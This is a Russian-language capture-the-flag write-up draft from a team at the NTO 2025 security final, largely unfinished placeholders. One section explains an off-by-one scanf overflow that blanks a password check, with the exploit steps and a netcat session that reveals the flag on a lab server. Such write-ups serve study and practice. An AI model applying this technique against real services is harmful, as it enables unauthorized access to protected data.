# Райтап на финал иб нто 2025 от команды While_hot_false
## Состав
* Walter White
* eogod
* Kolya080808
* kvasilek
## Задачи с коротким ответом

## Web
## Pwn 1
Из функции write_file() : 
```
  printf("Enter file content: ");
  __isoc99_scanf("%256s", file_buffer);
  flush();
  file = open(path, 65, 0, v0, v1, v2);
```
При этом file buffer сам размером 256 байт, а после него лежит secret password:
```
.bss:0000000000004120 file_buffer     db 100h dup(?)          ; DATA XREF: init_storage+70↑o
.bss:0000000000004120                                         ; init_storage+A8↑o ...
.bss:0000000000004220                 public secret_password
.bss:0000000000004220 ; char secret_password[32]
.bss:0000000000004220 secret_password db 20h dup(?)   
```
scanf("%256s", file_buffer) записывает максимум 256 байт + 1 ноль байт, который попадёт уже в secret_pasword. В итоге пароль начинается с 0x00, то есть по факту пустая строка. \
Решение: 
* Записываем в файл 256 букв 
* Запрашиваем чтение 00000000 и при запросе пароля просто нажимаем enter 
* Получаем флаг
```
nc 10.10.11.101 9001
                    
            +++++++                )                           
          +++      ++           ( /(   (     )           (     
   ++++++++         ++++        )\()) ))   (     `  )   )\ )  
  ++                   +++     (_))/ /((_)  )\  ' /(/(  (()/(  
 ++          ++          ++    | |_ (_))  _((_)) ((_)_\  )(_)) 
 ++        ++++++.       ++    |  _|/ -_)| '  \()| '_ \)| || | 
  +++        ++        +++      \__|\___||_|_|_| | .__/  \_, | 
    :+++++++ ++  +++++++                         |_|     |__/  
             ++                                  
             ++                                  
    finally, service for reading and             
                writng your OWN temporary files! 


Commands:
        1. Read file
        2. Write file
>> 2
Enter file content: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Your file ID: 0a09d600

Commands:
        1. Read file
        2. Write file
>> 1
Enter file ID: 00000000
Opa, give me password: 
File contains: nto{sup3r_s3cr3t_c0nf1d3ntial_fl4g}
Commands:
        1. Read file
        2. Write file
>> 

```
### Касса
перенос строк через \ кстати делается \
перенос строк через \ кстати делается
## Infra

### Confluence
всем респект
### NAS
да таск халява
### NAS2
коля респект
### Сервер печати

## Задачи с защитой
## Горшочек
текст решения \
перенос строк через \ кстати делается

## Linux


## Markdown 
[Как пользоваться](https://github.com/adam-p/markdown-here/wiki/markdown-cheatsheet#lists)
